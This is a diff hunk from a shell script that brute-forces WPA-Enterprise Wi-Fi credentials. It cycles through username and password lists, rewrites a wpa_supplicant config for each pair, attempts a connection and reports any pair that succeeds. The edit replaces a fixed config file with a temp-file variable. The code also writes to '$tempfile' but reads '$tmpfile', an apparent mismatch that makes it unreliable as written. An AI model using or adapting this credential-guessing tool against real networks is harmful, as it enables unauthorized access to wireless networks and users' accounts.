@@ -44,12 +44,12 @@ fi
 
 for user in $(cat $ufile); do 
    for pwd in $(cat $pfile) ;do 
-      cat wpa.conf | \
+      cat $tmpfile | \
       sed -e "s/ssid=\".*\"/ssid=\"$ssid\"/" | \
       sed -e "s/identity=\".*\"/identity=\"$user\"/" | \
       sed -e "s/password=\".*\"/password=\"$pwd\"/" > $tempfile
       [ ! -z "$debug" ] && echo "Trying $user:$pwd" 
-      if timeout $t ${wpa_sup} -c ./wpa.conf -i $iface 2>/dev/null | grep complete >/dev/null ; then 
+      if timeout $t ${wpa_sup} -c $tmpfile -i $iface 2>/dev/null | grep complete >/dev/null ; then 
          echo "Credential found: $user:$pwd" 
       fi
    done
